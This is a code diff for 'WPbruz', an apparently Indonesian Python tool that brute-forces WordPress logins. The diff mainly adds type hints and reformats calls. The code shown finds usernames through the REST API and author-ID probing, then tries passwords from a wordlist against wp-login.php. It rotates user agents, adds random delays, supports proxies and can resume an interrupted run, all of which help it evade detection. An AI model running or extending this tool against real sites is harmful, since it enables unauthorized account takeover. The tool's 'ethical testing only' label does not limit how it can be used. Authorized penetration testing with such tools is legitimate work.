@@ -13,6 +13,7 @@ import platform
 import subprocess
 
 from pathlib import Path
+from typing import List, Optional, Tuple
 
 # ──────────────────────────────────────────────────────────────────────────────
 #  Terminal Color Codes
@@ -61,7 +62,7 @@ def clear_screen():
     subprocess.call(cmd, shell=True)
 
 # ──────────────────────────────────────────────────────────────────────────────
-def setup_logging(log_file: Path = None, debug: bool = False):
+def setup_logging(log_file: Optional[Path] = None, debug: bool = False):
     """Configure logging to console and optional file."""
     level = logging.DEBUG if debug else logging.INFO
     handlers = [logging.StreamHandler(sys.stdout)]
@@ -74,13 +75,17 @@ def setup_logging(log_file: Path = None, debug: bool = False):
     )
 
 # ──────────────────────────────────────────────────────────────────────────────
-def get_usernames(target_url: str, timeout: float) -> list[str]:
+def get_usernames(target_url: str, timeout: float) -> List[str]:
     """Try WP REST API first, fallback to author enumeration."""
-    users = []
+    users: List[str] = []
     api_url = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
     logging.info("Mencoba REST API: %s", api_url)
     try:
-        resp = requests.get(api_url, timeout=timeout, headers={"User-Agent": random.choice(USER_AGENTS)})
+        resp = requests.get(
+            api_url,
+            timeout=timeout,
+            headers={"User-Agent": random.choice(USER_AGENTS)},
+        )
         if resp.status_code == 200:
             data = resp.json()
             for u in data:
@@ -98,8 +103,12 @@ def get_usernames(target_url: str, timeout: float) -> list[str]:
     for i in range(1, 11):
         url = f"{target_url.rstrip('/')}/?author={i}"
         try:
-            resp = requests.get(url, timeout=timeout, allow_redirects=True,
-                                headers={"User-Agent": random.choice(USER_AGENTS)})
+            resp = requests.get(
+                url,
+                timeout=timeout,
+                allow_redirects=True,
+                headers={"User-Agent": random.choice(USER_AGENTS)},
+            )
             if resp.status_code == 200:
                 m = re.search(r"/author/([^/]+)/?", resp.url)
                 if m:
@@ -113,7 +122,7 @@ def get_usernames(target_url: str, timeout: float) -> list[str]:
     return users
 
 # ──────────────────────────────────────────────────────────────────────────────
-def pilih_username(usernames: list[str]) -> str | None:
+def pilih_username(usernames: List[str]) -> Optional[str]:
     """Interactive select from list."""
     if not usernames:
         print(f"{RED}[❌] Tidak ada username ditemukan.{RESET}")
@@ -136,12 +145,12 @@ def pilih_username(usernames: list[str]) -> str | None:
 def bruteforce_wp(
     target_url: str,
     username: str,
-    passwords: list[str],
+    passwords: List[str],
     timeout: float,
-    delay_range: tuple[float, float],
-    resume_file: Path | None,
-    proxy: str | None
-) -> str | None:
+    delay_range: Tuple[float, float],
+    resume_file: Optional[Path],
+    proxy: Optional[str]
+) -> Optional[str]:
     """Brute-force WordPress login sequentially, with resume checkpoint."""
     login_url = f"{target_url.rstrip('/')}/wp-login.php"
     session = requests.Session()
@@ -155,8 +164,7 @@ def bruteforce_wp(
 
     for idx in range(start_idx, len(passwords)):
         pwd = passwords[idx]
-        # random delay
-        time.sleep(random.uniform(*delay_range))
+        time.sleep(random.uniform(delay_range[0], delay_range[1]))
 
         data = {
             "log": username,
@@ -206,14 +214,16 @@ def main():
     clear_screen()
     print(ASCII_ART)
 
-    p = argparse.ArgumentParser(
+    parser = argparse.ArgumentParser(
         description="WPbruz — Brute-force WordPress (ethical testing only)"
     )
-    p.add_argument("target", help="URL target, e.g. https://example.com")
-    p.add_argument("wordlist", help="Path ke file password list")
-    p.add_argument("--username", help="Username WordPress (jika sudah tahu)")
-    p.add_argument("--timeout", type=float, default=10.0, help="Timeout request (detik)")
-    p.add_argument(
+    parser.add_argument("target", help="URL target, e.g. https://example.com")
+    parser.add_argument("wordlist", help="Path ke file password list")
+    parser.add_argument("--username", help="Username WordPress (jika sudah tahu)")
+    parser.add_argument(
+        "--timeout", type=float, default=10.0, help="Timeout request (detik)"
+    )
+    parser.add_argument(
         "--delay",
         type=float,
         nargs=2,
@@ -221,11 +231,13 @@ def main():
         default=(1.0, 3.0),
         help="Jeda acak antar request (detik)"
     )
-    p.add_argument("--proxy", help="Proxy (socks5://host:port atau http://host:port)")
-    p.add_argument("--resume-file", default=".wpbruz_resume", help="File checkpoint resume")
-    p.add_argument("--log-file", help="Simpan log ke file")
-    p.add_argument("--debug", action="store_true", help="Tampilkan debug output")
-    args = p.parse_args()
+    parser.add_argument("--proxy", help="Proxy (socks5://host:port atau http://host:port)")
+    parser.add_argument(
+        "--resume-file", default=".wpbruz_resume", help="File checkpoint resume"
+    )
+    parser.add_argument("--log-file", help="Simpan log ke file")
+    parser.add_argument("--debug", action="store_true", help="Tampilkan debug output")
+    args = parser.parse_args()
 
     setup_logging(Path(args.log_file) if args.log_file else None, args.debug)
 
@@ -254,7 +266,7 @@ def main():
         username=user,
         passwords=pwds,
         timeout=args.timeout,
-        delay_range=tuple(args.delay),
+        delay_range=(args.delay[0], args.delay[1]),
         resume_file=Path(args.resume_file),
         proxy=args.proxy,
     )
